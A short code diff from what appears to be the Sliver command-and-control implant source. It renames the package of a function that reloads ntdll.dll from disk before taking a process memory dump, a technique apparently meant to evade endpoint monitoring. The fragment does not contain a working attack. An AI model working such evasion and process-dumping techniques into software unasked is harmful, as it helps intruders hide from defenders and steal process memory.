@@ -27,7 +27,7 @@ import (
 	//{{end}}
 
 	// {{if eq .GOARCH "amd64"}}
-	"github.com/bishopfox/sliver/sliver/taskrunner"
+	"github.com/bishopfox/sliver/sliver/evasion"
 	// {{end}}
 	"github.com/bishopfox/sliver/sliver/syscalls"
 	"github.com/bishopfox/sliver/sliver/priv"
@@ -67,7 +67,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	dump := &WindowsDump{}
 	// {{if eq .GOARCH "amd64"}}
 	// Hotfix for #66 - need to dig deeper
-	err := taskrunner.RefreshPE(`c:\windows\system32\ntdll.dll`)
+	err := evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
 	if err != nil {
 		//{{if .Debug}}
 		log.Println("RefreshPE failed:", err)
